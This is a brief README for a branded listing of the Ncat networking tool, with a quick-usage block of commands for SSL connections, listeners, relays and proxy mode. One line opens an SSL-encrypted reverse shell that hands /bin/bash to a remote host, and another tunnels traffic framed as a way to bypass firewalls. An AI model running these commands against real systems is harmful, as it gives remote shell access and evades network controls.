# 🔌 ScottsTechX Ncat

<p align="center">
  <img src="https://img.shields.io/badge/Ncat-SSL-Netcat-00ff88?style=for-the-badge&logo=linux&logoColor=black" alt="Ncat"/>
  <img src="https://img.shields.io/badge/Open-Source-00ff88?style=for-the-badge&logo=github&logoColor=black" alt="Open Source"/>
</p>

> **Netcat on steroids — SSL-enabled, relay, proxy, reverse shell with encryption.**

---

## ⚡ What It Does

Ncat is a modern, enhanced netcat with SSL support, connection brokering, HTTP tunneling, and built-in proxy functionality. Secure alternative to traditional netcat.

## 🚀 Quick Usage

```bash
# SSL-enabled connection
ncat --ssl target.com 443

# Listen with SSL
ncat -lvp 4444 --ssl

# Reverse shell with SSL
ncat --ssl 10.0.0.1 4444 -e /bin/bash

# HTTP tunnel (bypass firewalls)
ncat -l 8080 --sh-exec "ncat target.com 80"

# Connection brokering (relay between clients)
ncat -l 4444 --broker

# Proxy mode
ncat -l 1080 --proxy-type http --proxy-auth user:pass
```

---

MIT © 2026
